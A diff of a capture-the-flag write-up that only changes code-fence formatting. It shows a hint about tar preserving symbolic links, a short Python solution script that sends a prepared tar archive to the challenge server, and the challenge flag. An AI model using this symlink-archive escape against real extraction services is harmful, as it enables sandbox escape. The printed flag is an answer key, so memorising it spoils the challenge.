@@ -21,14 +21,14 @@ Hint: symbolic link (透過 tar 可保留 synblic link)
 
 Here is the misc3_sol.py code 
 
-`
+```
 import telnetlib
 
 data = str.encode(list(open('guess.tar'))[0])
 client = telnetlib.Telnet('quiz.ais3.org', 9150)
 client.write(str.encode(str(len(data))) + '\n' + data)
 print(client.read_all())
-`
+```
 
 The key is `ais3{First t1me 1$sc4pe tHE S4nd80x}`
 
